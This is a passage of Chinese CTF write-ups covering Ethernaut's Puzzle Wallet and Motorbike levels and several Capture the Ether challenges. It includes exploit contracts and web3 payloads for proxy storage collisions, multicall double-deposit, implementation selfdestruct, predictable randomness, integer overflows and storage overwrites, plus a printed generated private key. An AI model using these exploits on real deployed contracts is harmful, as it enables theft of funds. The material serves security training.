DeFi 运营付费是不可能的。\n一群朋友发现了如何通过在一个交易中批量处理来稍微降低执行多个交易的成本，因此他们开发了一个智能合约来执行此操作。\n他们需要这个合约是可升级的，以防代码包含错误，他们还想阻止团队外的人使用它。 为此，他们投票并分配了两个在系统中具有特殊角色的人：管理员，有权更新智能合约的逻辑。 所有者，控制允许使用合约的地址白名单。 合同已部署，该组被列入白名单。 每个人都为他们对抗邪恶矿工的成就欢呼。\n他们几乎不知道，他们的午餐钱处于危险之中……\n你需要劫持这个钱包才能成为代理的管理员。\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;pragma experimental ABIEncoderV2;import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;import &quot;@openzeppelin/contracts/proxy/UpgradeableProxy.sol&quot;;contract PuzzleProxy is UpgradeableProxy &#123;    address public pendingAdmin;    address public admin;    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public &#123;        admin = _admin;    &#125;    modifier onlyAdmin &#123;      require(msg.sender == admin, &quot;Caller is not the admin&quot;);      _;    &#125;    function proposeNewAdmin(address _newAdmin) external &#123;        pendingAdmin = _newAdmin;    &#125;    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);        admin = pendingAdmin;    &#125;    function upgradeTo(address _newImplementation) external onlyAdmin &#123;        _upgradeTo(_newImplementation);    &#125;&#125;contract PuzzleWallet &#123;    using SafeMath for uint256;    address public owner;    uint256 public maxBalance;    mapping(address =&gt; bool) public whitelisted;    mapping(address =&gt; uint256) public balances;    function init(uint256 _maxBalance) public &#123;        require(maxBalance == 0, &quot;Already initialized&quot;);        maxBalance = _maxBalance;        owner = msg.sender;    &#125;    modifier onlyWhitelisted &#123;        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);        _;    &#125;    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);      maxBalance = _maxBalance;    &#125;    function addToWhitelist(address addr) external &#123;        require(msg.sender == owner, &quot;Not the owner&quot;);        whitelisted[addr] = true;    &#125;    function deposit() external payable onlyWhitelisted &#123;      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);      balances[msg.sender] = balances[msg.sender].add(msg.value);    &#125;    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);        balances[msg.sender] = balances[msg.sender].sub(value);        (bool success, ) = to.call&#123; value: value &#125;(data);        require(success, &quot;Execution failed&quot;);    &#125;    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;        bool depositCalled = false;        for (uint256 i = 0; i &lt; data.length; i++) &#123;            bytes memory _data = data[i];            bytes4 selector;            assembly &#123;                selector := mload(add(_data, 32))            &#125;            if (selector == this.deposit.selector) &#123;                require(!depositCalled, &quot;Deposit can only be called once&quot;);                // Protect against reusing msg.value                depositCalled = true;            &#125;            (bool success, ) = address(this).delegatecall(data[i]);            require(success, &quot;Error while delegating call&quot;);        &#125;    &#125;&#125;\n\n合约分析先看一下子合约UpgradeableProxy\n\nProxy Patterns\n\n这里的漏洞是由于代理合约 ( ) 和逻辑合约 ( ) 之间的存储冲突而出现的。\n在代理模式中，发送的任何调用/事务都不会直接转到逻辑合约（PuzzleWallet此处），但实际上是通过方法委托给代理合约（PuzzleProxy此处）内部的逻辑合约delegatecall。\n由于delegatecall是上下文保留，因此上下文取自PuzzleProxy。这意味着，存储中的任何状态读取或写入都将发生在PuzzleProxy相应的插槽中，而不是PuzzleWallet.\n有\nslot | PuzzleWallet  -  PuzzleProxy---------------------------------- 0   |   owner      &lt;-  pendingAdmin 1   |   maxBalance &lt;-  admin 2   |           .  3   |           .\n\n\n这意味着如果我们设置 pendingAdmin 为 player （通过  PuzzleProxy 中的 proposeNewAdmin 方法）， player 则自动成为 owner ！\n由于proposeNewAdmin 方法设置为 external ，不能直接调用，但我们可以对函数调用的签名进行编码并将交易发送到合约\n\nadmin 也和 maxBalance对应于相同的插槽（插槽 1）。如果我们可以admin以某种方式写入maxBalance的地址，我们可以写入player。\nsetMaxBalance 只有当合约的余额为0时才能设置新 maxBalance 的\n检查余额：\nawait getBalance(contract.address)//0.001\n\n可以通过 execute 取出合约中的余额，但合约会跟踪每个用户的余额balances，您只能提取您存入的资金。我们需要一些方法来破解合约的记账机制，这样我们就可以提取比存入更多的钱，从而耗尽合约的余额。\n可以多次调用相同deposit的方法，并且合约中的 multicall 方法可以将多笔交易批处理为一笔交易。 但是 multicall 会从数据中提取函数选择器（签名的前 4 个字节），并确保 deposit 每个事务只调用一次\n所以选择调用一个 multicall ，其中调用多个multicall 并且这些 multicall 中的每一个都调用 deposit 一次\n       multicall          |   -----------------   |               |multicall        multicall   |                 | deposit          deposit     \n\n攻击流程\n将 player 设置为 owner\n\nfunctionSignature = &#123;    name: &#x27;proposeNewAdmin&#x27;,    type: &#x27;function&#x27;,    inputs: [        &#123;            type: &#x27;address&#x27;,            name: &#x27;_newAdmin&#x27;        &#125;    ]&#125;params = [player]data = web3.eth.abi.encodeFunctionCall(functionSignature, params)await web3.eth.sendTransaction(&#123;from: player, to: instance, data&#125;)\n\n\n验证owner并查询余额\n\n\n\n\n将owner我们列入白名单\n\nawait contract.addToWhitelist(player)\n\n\n获取函数调用编码\n\ndepositData = await contract.methods[&quot;deposit()&quot;].request().then(v =&gt; v.data)//&#x27;0xd0e30db0&#x27;multicallData = await contract.methods[&quot;multicall(bytes[])&quot;].request([depositData]).then(v =&gt; v.data)//&#x27;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&#x27;\n\n\n调用multicall\n\nawait contract.multicall([multicallData, multicallData], &#123;value: toWei(&#x27;0.001&#x27;)&#125;)\n\n\n提取相同的金额\n\nawait contract.execute(player, toWei(&#x27;0.002&#x27;), 0x0)\n\n\n检查余额\n\n\n\n将 admin 设置为player：\n\nawait contract.setMaxBalance(player)\n\n\n25. Motorbike闯关要求Ethernaut 的摩托车拥有全新的可升级引擎设计。\n你能自毁它的引擎并使摩托车无法使用吗？\n合约代码// SPDX-License-Identifier: MITpragma solidity &lt;0.7.0;import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;import &quot;@openzeppelin/contracts/proxy/Initializable.sol&quot;;contract Motorbike &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;        struct AddressSlot &#123;        address value;    &#125;        // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.    constructor(address _logic) public &#123;        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;        (bool success,) = _logic.delegatecall(            abi.encodeWithSignature(&quot;initialize()&quot;)        );        require(success, &quot;Call failed&quot;);    &#125;    // Delegates the current call to `implementation`.    function _delegate(address implementation) internal virtual &#123;        // solhint-disable-next-line no-inline-assembly        assembly &#123;            calldatacopy(0, 0, calldatasize())            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)            returndatacopy(0, 0, returndatasize())            switch result            case 0 &#123; revert(0, returndatasize()) &#125;            default &#123; return(0, returndatasize()) &#125;        &#125;    &#125;    // Fallback function that delegates calls to the address returned by `_implementation()`.     // Will run if no other function in the contract matches the call data    fallback () external payable virtual &#123;        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);    &#125;        // Returns an `AddressSlot` with member `value` located at `slot`.    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;        assembly &#123;            r_slot := slot        &#125;    &#125;&#125;contract Engine is Initializable &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    address public upgrader;    uint256 public horsePower;    struct AddressSlot &#123;        address value;    &#125;    function initialize() external initializer &#123;        horsePower = 1000;        upgrader = msg.sender;    &#125;    // Upgrade the implementation of the proxy to `newImplementation`    // subsequently execute the function call    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;        _authorizeUpgrade();        _upgradeToAndCall(newImplementation, data);    &#125;    // Restrict to upgrader role    function _authorizeUpgrade() internal view &#123;        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);    &#125;    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.    function _upgradeToAndCall(        address newImplementation,        bytes memory data    ) internal &#123;        // Initial upgrade and setup call        _setImplementation(newImplementation);        if (data.length &gt; 0) &#123;            (bool success,) = newImplementation.delegatecall(data);            require(success, &quot;Call failed&quot;);        &#125;    &#125;        // Stores a new address in the EIP1967 implementation slot.    function _setImplementation(address newImplementation) private &#123;        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);                AddressSlot storage r;        assembly &#123;            r_slot := _IMPLEMENTATION_SLOT        &#125;        r.value = newImplementation;    &#125;&#125;\n\n合约分析Initializable.sol\n当前的 Engine 在任何地方都没有自毁逻辑。但是，由于它是代理模式的逻辑/实现合约，它可以升级为具有 selfdestruct 的新合约。\nupgradeToAndCall 方法可供我们升级到新的合约地址，但它有一个授权检查 _authorizeUpgrade ，只有升级者地址才能调用它。\n所以，我们需要更改 upgrader 的信息\n注意，这里和 Puzzle Wallet 关卡一样， Engine 实际上存储在代理（ Motorbike ）的存储中。\n我们可以在 Engine 的地址调用初始化，使initialized, initializing (来自 Initializable), upgrader 为默认值即false, false, 0x0 \n// Initializable.solbool private _initialized;bool private _initializing;modifier initializer() &#123;        // If the contract is initializing we ignore whether _initialized is set in order to support multiple        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the        // contract may have been reentered.        require(_initializing ? _isConstructor() : !_initialized, &quot;Initializable: contract is already initialized&quot;);        bool isTopLevelCall = !_initializing;        if (isTopLevelCall) &#123;            _initializing = true;            _initialized = true;        &#125;        _;        if (isTopLevelCall) &#123;            _initializing = false;        &#125;    &#125;\n\n写一个有 selfdestruct 函数的合约，并通过 upgradeToAndCall 方法升级执行合约\n如果我们通过 upgradeToAndCall 设置新的实现，将 attackEngine 地址和它的 explode 方法的编码作为参数传递，现有的 Engine 将自行销毁。 这是因为 _upgradeToAndCall 使用提供的数据参数将调用委托给给定的新实现地址。 并且由于 delegatecall 是上下文保留的，explode 方法的 selfdestruct 将在 Engine 的上下文中运行。 因此引擎被摧毁。\npragma solidity &lt;0.7.0;contract attackEngine &#123;    function explode() public &#123;        selfdestruct(address(0));    &#125;&#125;\n\n攻击流程//读取 Engine 地址implAddr = await web3.eth.getStorageAt(contract.address, &#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;)//&#x27;0x000000000000000000000000a81263b7b5c02eb2e8740dd9d224daab59fa5035&#x27;implAddr = &#x27;0x&#x27; + implAddr.slice(-40)//&#x27;0xa81263b7b5c02eb2e8740dd9d224daab59fa5035&#x27;//在 Engine 的地址调用初始化initializeData = web3.eth.abi.encodeFunctionSignature(&quot;initialize()&quot;)//&#x27;0x8129fc1c&#x27;await web3.eth.sendTransaction(&#123; from: player, to: implAddr, data: initializeData &#125;)//设置 upgrader 并验证upgraderData = web3.eth.abi.encodeFunctionSignature(&quot;upgrader()&quot;)//&#x27;0xaf269745&#x27;await web3.eth.call(&#123;from: player, to: implAddr, data: upgraderData&#125;).then(v =&gt; &#x27;0x&#x27; + v.slice(-40).toLowerCase()) === player.toLowerCase()//true//部署 attackEngine 合约并设置合约地址attackAddr = &#x27;0x030e5e8743dFb45E68D9010200b9aADeB7578EcF&#x27;//&#x27;0x030e5e8743dFb45E68D9010200b9aADeB7578EcF&#x27;explodeData = web3.eth.abi.encodeFunctionSignature(&quot;explode()&quot;)//&#x27;0xb8b3dbc6&#x27;//升级合约upgradeSignature = &#123;    name: &#x27;upgradeToAndCall&#x27;,    type: &#x27;function&#x27;,    inputs: [        &#123;            type: &#x27;address&#x27;,            name: &#x27;newImplementation&#x27;        &#125;,        &#123;            type: &#x27;bytes&#x27;,            name: &#x27;data&#x27;        &#125;    ]&#125;upgradeParams = [attackAddr, explodeData]upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)//&#x27;0x4f1ef286000000000000000000000000030e5e8743dfb45e68d9010200b9aadeb7578ecf00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004b8b3dbc600000000000000000000000000000000000000000000000000000000&#x27;//在 implAddr 调用 upgradeToAndCallawait web3.eth.sendTransaction(&#123;from: player, to: implAddr, data: upgradeData&#125;)\n\n\n"},{"title":"capture the ether wp","url":"/2022/04/02/capture%20the%20ether%20wp/","content":"capture the ether wp地址：https://capturetheether.com/\nWarmupDeploy a contract连接 MetaMask 即可\nCall me要求调用callme函数\n在remix的deploy处将我们挑战的页面里给出的合约地址填上，部署后调用即可\n\nChoose a nickname设置自己的昵称\npragma solidity ^0.4.21;// Relevant part of the CaptureTheEther contract.contract CaptureTheEther &#123;    mapping (address =&gt; bytes32) public nicknameOf;    function setNickname(bytes32 nickname) public &#123;        nicknameOf[msg.sender] = nickname;    &#125;&#125;// Challenge contract. You don&#x27;t need to do anything with this; it just verifies// that you set a nickname for yourself.contract NicknameChallenge &#123;    CaptureTheEther cte = CaptureTheEther(msg.sender);    address player;    // Your address gets passed in as a constructor parameter.    function NicknameChallenge(address _player) public &#123;        player = _player;    &#125;    // Check that the first character is not null.    function isComplete() public view returns (bool) &#123;        return cte.nicknameOf(player)[0] != 0;    &#125;&#125;\n\n同样的在remix里操作即可\n注意要将昵称转化为十六进制，并且 return cte.nicknameOf(player)[0] != 0;\nLotteriesGuess the numberpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123;    uint8 answer = 42;    function GuessTheNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n\n已知 answer = 42\n注意调用guess函数并传参42的同时发送1 ether\nGuess the secret numberpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123;    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    function GuessTheSecretNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (keccak256(n) == answerHash) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n\n可以计算答案\npragma solidity ^0.4.18;contract guess &#123;    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    uint8 public answer = 0;        function guessanswer() returns (uint8) &#123;        for(uint8 i = 0;i &lt;= 256;i ++)&#123;            if(keccak256(i) == answerHash)&#123;                answer = i;                return answer;            &#125;        &#125;    &#125;&#125;\n\nGuess the random numberpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123;    uint8 answer;    function GuessTheRandomNumberChallenge() public payable &#123;        require(msg.value == 1 ether);        answer = uint8(keccak256(block.blockhash(block.number - 1), now));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n\n可以去交易详情查看\n\n即77\nGuess the new numberpragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123;    function GuessTheNewNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n\n写一个 constructor() ，部署时打入1ETH\ncontract attacker &#123;    constructor() public payable &#123;            &#125;     function attack() public payable &#123;        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x311e6C0Ae5476ad374c0e7A9B4582ac1eB42b213);        target.guess.value(1 ether)(result);    &#125;    function() public payable &#123;    &#125;    function destroy() public payable &#123;        selfdestruct(msg.sender);    &#125;&#125;\n\nPredict the futurepragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123;    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(uint8 n) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n\n让answer来就我们，按照规则一次一次地尝试生成answer，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数\ncontract attacker &#123;    PredictTheFutureChallenge target;    uint8 result;    constructor() public payable &#123;        target = PredictTheFutureChallenge(0xf6C4f214fDF6B367255281c0cF65653B0820F1F9);    &#125;    function attack() payable&#123;        target.lockInGuess.value(1 ether)(3);    &#125;    function exploit() &#123;        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if(result == 3)&#123;            target.settle();        &#125;    &#125;    function see() view returns (uint8) &#123;        return result;    &#125;    function destroy() payable &#123;        selfdestruct(msg.sender);    &#125;&#125;\n\n\n\nPredict the block hashpragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123;    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(bytes32 hash) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n\n\n我们看到该函数仅适用于最近的 256 个块。如果您尝试调用发生在 300 块前的函数，它会返回零。\ncontract attacker &#123;    PredictTheBlockHashChallenge target = PredictTheBlockHashChallenge(0xB562947997118272df148A0c5d8Ca1d6aEb4948F);    uint256 settlementBlockNumber;    constructor() payable &#123;    &#125;    function attack() payable &#123;        settlementBlockNumber = block.number + 1;        target.lockInGuess.value(1 ether)(0x0000000000000000000000000000000000000000000000000000000000000000);    &#125;    function exploit() &#123;        require(block.number-settlementBlockNumber&gt;=256);        target.settle();    &#125;    function destroy() payable &#123;        selfdestruct(msg.sender);    &#125;&#125;\n\nMathToken salepragma solidity ^0.4.21;contract TokenSaleChallenge &#123;    mapping(address =&gt; uint256) public balanceOf;    uint256 constant PRICE_PER_TOKEN = 1 ether;    function TokenSaleChallenge(address _player) public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance &lt; 1 ether;    &#125;    function buy(uint256 numTokens) public payable &#123;        require(msg.value == numTokens * PRICE_PER_TOKEN);        balanceOf[msg.sender] += numTokens;    &#125;    function sell(uint256 numTokens) public &#123;        require(balanceOf[msg.sender] &gt;= numTokens);        balanceOf[msg.sender] -= numTokens;        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);    &#125;&#125;\n\nrequire(msg.value == numTokens * PRICE_PER_TOKEN); 存在整数乘法上溢\n1 ether = 10^18 wei//最大的uint256 = = 115792089237316195423570985008687907853269984665640564039457584007913129639936numTokens = 2**256 / 10**18 + 1 = 115792089237316195423570985008687907853269984665640564039458//value = numTokens*10**18-2**256 = 415992086870360064\n\nvalue为 0.415992086870360064 ether，要求 msg.value == numTokens * PRICE_PER_TOKEN 可以被满足。\n然后我们可以 sell() 1 ether，合约余额现在为 0.41ether\nToken whaleFind a way to accumulate at least 1,000,000 tokens to solve this challenge.\npragma solidity ^0.4.21;contract TokenWhaleChallenge &#123;    address player;    uint256 public totalSupply;    mapping(address =&gt; uint256) public balanceOf;    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    string public name = &quot;Simple ERC20 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    function TokenWhaleChallenge(address _player) public &#123;        player = _player;        totalSupply = 1000;        balanceOf[player] = 1000;    &#125;    function isComplete() public view returns (bool) &#123;        return balanceOf[player] &gt;= 1000000;    &#125;    event Transfer(address indexed from, address indexed to, uint256 value);    function _transfer(address to, uint256 value) internal &#123;        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);    &#125;    function transfer(address to, uint256 value) public &#123;        require(balanceOf[msg.sender] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        _transfer(to, value);    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    function approve(address spender, uint256 value) public &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);    &#125;    function transferFrom(address from, address to, uint256 value) public &#123;        require(balanceOf[from] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        require(allowance[from][msg.sender] &gt;= value);        allowance[from][msg.sender] -= value;        _transfer(to, value);    &#125;&#125;\n\n_transfer函数存在溢出\n\naccount1 transfer(account2,1000)\naccount2 approve(account1,1000)\naccount1 transferFrom(account2,account3,1000)\n\n由于此时account1的代币余额为0，所以最后调用 _transfer 时会发生下溢\nRetirement fundpragma solidity ^0.4.21;contract RetirementFundChallenge &#123;    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function withdraw() public &#123;        require(msg.sender == owner);        if (now &lt; expiration) &#123;            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        &#125; else &#123;            msg.sender.transfer(address(this).balance);        &#125;    &#125;    function collectPenalty() public &#123;        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn &gt; 0);        // penalty is what&#x27;s left        msg.sender.transfer(address(this).balance);    &#125;&#125;\n\n使用selfdestruct函数，使 collectPenalty() 中的 require(withdrawn &gt; 0); 被满足\npragma solidity ^0.4.18;contract attacker &#123;    constructor() payable &#123;    &#125;    function attack() payable &#123;        selfdestruct(0xde595FF7D9DED625Db68A569BbA0b708e69d025a);    &#125;&#125;\n\nMappingpragma solidity ^0.4.21;contract MappingChallenge &#123;    bool public isComplete;    uint256[] map;    function set(uint256 key, uint256 value) public &#123;        // Expand dynamic array as needed        if (map.length &lt;= key) &#123;            map.length = key + 1;        &#125;        map[key] = value;    &#125;    function get(uint256 key) public view returns (uint256) &#123;        return map[key];    &#125;&#125;\n\n类似Ethernaut中的Alien Codex\n数组长度越界，计算相对位置覆盖isComplete\nDonationpragma solidity ^0.4.21;contract DonationChallenge &#123;    struct Donation &#123;        uint256 timestamp;        uint256 etherAmount;    &#125;    Donation[] public donations;    address public owner;    function DonationChallenge() public payable &#123;        require(msg.value == 1 ether);                owner = msg.sender;    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function donate(uint256 etherAmount) public payable &#123;        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    &#125;    function withdraw() public &#123;        require(msg.sender == owner);                msg.sender.transfer(address(this).balance);    &#125;&#125;\n\nSolidity中存储方式错误使用所导致的变量覆盖\n使传入的etherAmount，其值等于我们的Account地址\n并满足msg.value == etherAmount / scal\nuint(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624) / (10**18*10**18)//900803868558\n\n然后调用withdraw\nFifty yearspragma solidity ^0.4.21;contract FiftyYearsChallenge &#123;    struct Contribution &#123;        uint256 amount;        uint256 unlockTimestamp;    &#125;    Contribution[] queue;    uint256 head;    address owner;    function FiftyYearsChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        owner = player;        queue.push(Contribution(msg.value, now + 50 years));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function upsert(uint256 index, uint256 timestamp) public payable &#123;        require(msg.sender == owner);        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;            // Update existing contribution amount without updating timestamp.            Contribution storage contribution = queue[index];            contribution.amount += msg.value;        &#125; else &#123;            // Append a new contribution. Require that each contribution unlock            // at least 1 day after the previous one.            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);            contribution.amount = msg.value;            contribution.unlockTimestamp = timestamp;            queue.push(contribution);        &#125;    &#125;    function withdraw(uint256 index) public &#123;        require(msg.sender == owner);        require(now &gt;= queue[index].unlockTimestamp);        // Withdraw this and any earlier contributions.        uint256 total = 0;        for (uint256 i = head; i &lt;= index; i++) &#123;            total += queue[i].amount;            // Reclaim storage.            delete queue[i];        &#125;        // Move the head of the queue forward so we don&#x27;t have to loop over        // already-withdrawn contributions.        head = index + 1;        msg.sender.transfer(total);    &#125;&#125;\n\nmsg.value会覆盖queue的长度，timestamp会覆盖head\nqueue.push操作，因为其在最后执行增添对象的任务，添加以后它会将queue.length进行+1操作，用queue长度再覆盖contribution.amount一次\n\n首先，我们创建一个新的队列条目，调用upsert准备绕过timestamp检查。我们选择timestamp这样的值，它会queue[queue.length - 1].unlockTimestamp + 1 days以等于零的方式溢出。\n2**256-86400115792089237316195423570985008687907853269984665640564039457584007913129553536\n\n调用Upset(1,115792089237316195423570985008687907853269984665640564039457584007913129553536)并发送1 wei\n\n调用Upset(1,0)并发送1 wei\n\n调用withdraw(1)\n\n\nAccountsFuzzy identitypragma solidity ^0.4.21;interface IName &#123;    function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123;    bool public isComplete;    function authenticate() public &#123;        require(isSmarx(msg.sender));        require(isBadCode(msg.sender));        isComplete = true;    &#125;    function isSmarx(address addr) internal view returns (bool) &#123;        return IName(addr).name() == bytes32(&quot;smarx&quot;);    &#125;    function isBadCode(address _addr) internal pure returns (bool) &#123;        bytes20 addr = bytes20(_addr);        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;        for (uint256 i = 0; i &lt; 34; i++) &#123;            if (addr &amp; mask == id) &#123;                return true;            &#125;            mask &lt;&lt;= 4;            id &lt;&lt;= 4;        &#125;        return false;    &#125;&#125;\n\n要求：\n\n合约的name为smarx\n合约地址里包含 badc0de\n\n以太坊源码中生成合约地址的算法\nfunc CreateAddress(b common.Address, nonce uint64) common.Address &#123;    data, _ := rlp.EncodeToBytes([]interface&#123;&#125;&#123;b, nonce&#125;) //对地址和nonce进行rlp编码    return common.BytesToAddress(Keccak256(data)[12:]) //利用keccak256算hash，后20个字节作为新地址&#125;\n\n使用ethjs-account来生成地址\nconst rlp = require(&#x27;rlp&#x27;);const js = require(&#x27;_js-sha3@0.8.0@js-sha3&#x27;);const generate = require(&#x27;ethjs-account&#x27;).generate;seed=&#x27;892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*&lt;&gt;FE8RG!FI;&quot;./+-*!DQ39hsoi@hoFE1F5^7E%&amp;*QS&#x27;//生成地址所用的种子function fuzz()&#123;    for(var k=0;k&lt;50000;k++)&#123;        seed=seed+Math.random().toString(36).substring(12);//为避免重复，生成一定数目后对种子进行更新        for(var i=0;i&lt;1000;i++)&#123;            res=generate(seed);            for (var j=0;j&lt;10;j++)&#123;                encodedRlp = rlp.encode([res.address, j]);// 进行rlp编码                buf = js.keccak256(encodedRlp);                contractAddress =buf.slice(24).toString(&#x27;hex&#x27;);//取buffer第12个字节后面的部分作为地址                if(contractAddress.slice(33).match(&quot;badc0de&quot;))&#123;                    console.log(contractAddress);                    console.log(res);                    console.log(j);                    return;                &#125;            &#125;            //console.log(i);        &#125;    &#125;&#125;fuzz();\n\n结果\n76e9f28df246ee1b3f7d3bb2c4c81e6f0badc0de&#123;  privateKey: &#x27;0x2f1c57a072bd38affcdeaf2c574b9e9c8c120b7391eb54a48a110345cbd1ae88&#x27;,  publicKey: &#x27;0xb111b1d6f154e4a87859bb2ad60bf05fd26abb7e77c6f26c4924803ee9673a3e55147652d2f2662d5a6591df503f27117c182ce1b20d8afaaf2b4d4ed6a07379&#x27;,  address: &#x27;0x4ABE0ad41C9A81289dCa9F257fd448264e18AB1B&#x27;&#125;8\n\nnonce为8时部署攻击合约\ncontract attack &#123;    FuzzyIdentityChallenge fuzz;    function pwn()&#123;        